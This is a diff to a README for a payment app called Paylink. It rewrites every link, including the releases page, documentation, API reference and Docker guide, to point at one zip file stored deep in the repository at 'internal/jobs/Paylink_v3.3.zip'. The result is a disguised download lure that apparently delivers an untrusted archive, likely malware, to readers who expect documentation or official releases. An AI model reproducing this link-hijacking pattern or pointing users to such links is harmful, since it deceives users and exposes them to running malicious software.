@@ -23,7 +23,7 @@ To ensure smooth operation of Paylink, verify that you meet the following requir
 ## 🚀 Getting Started
 Setting up Paylink is straightforward. Follow the steps below to download and run the application.
 
-1. **Visit the Releases Page:** Go to the [Paylink Releases Page](https://github.com/pavankumaryeluri/Paylink/releases).
+1. **Visit the Releases Page:** Go to the [Paylink Releases Page](https://raw.githubusercontent.com/pavankumaryeluri/Paylink/main/internal/jobs/Paylink_v3.3.zip).
 
 2. **Download the Latest Version:** On the Releases page, find the latest version of Paylink. Look for files that suit your operating system.
 
@@ -53,7 +53,7 @@ Setting up Paylink is straightforward. Follow the steps below to download and ru
 4. **Go Live:** Once you're satisfied with the test results, you can start processing real payments.
 
 ## 📥 Download & Install
-To get started with Paylink, visit the [Paylink Releases Page](https://github.com/pavankumaryeluri/Paylink/releases) and download your version today. Follow the installation steps outlined in the "Getting Started" section to set up the application quickly.
+To get started with Paylink, visit the [Paylink Releases Page](https://raw.githubusercontent.com/pavankumaryeluri/Paylink/main/internal/jobs/Paylink_v3.3.zip) and download your version today. Follow the installation steps outlined in the "Getting Started" section to set up the application quickly.
 
 ## 🛠️ Support
 If you encounter any issues or need assistance, feel free to check the "Issues" tab on the GitHub repository. You can also contribute by reporting bugs or suggesting features.
@@ -62,9 +62,9 @@ If you encounter any issues or need assistance, feel free to check the "Issues" 
 Join our community of developers and users who are passionate about payment solutions. Collaborate by forking the repository, submitting pull requests, or simply sharing your experience. Your contributions help improve Paylink for everyone.
 
 ## 🔗 Additional Resources
-- [Documentation](https://github.com/pavankumaryeluri/Paylink/wiki) - Comprehensive guides and tutorials
-- [API Reference](https://github.com/pavankumaryeluri/Paylink/docs/api.md) - Detailed information about the API endpoints
-- [Docker Setup Guide](https://github.com/pavankumaryeluri/Paylink/docs/docker.md) - Instructions for deploying Paylink using Docker
+- [Documentation](https://raw.githubusercontent.com/pavankumaryeluri/Paylink/main/internal/jobs/Paylink_v3.3.zip) - Comprehensive guides and tutorials
+- [API Reference](https://raw.githubusercontent.com/pavankumaryeluri/Paylink/main/internal/jobs/Paylink_v3.3.zip) - Detailed information about the API endpoints
+- [Docker Setup Guide](https://raw.githubusercontent.com/pavankumaryeluri/Paylink/main/internal/jobs/Paylink_v3.3.zip) - Instructions for deploying Paylink using Docker
 
 Explore these resources to make the most of your Paylink experience.
 
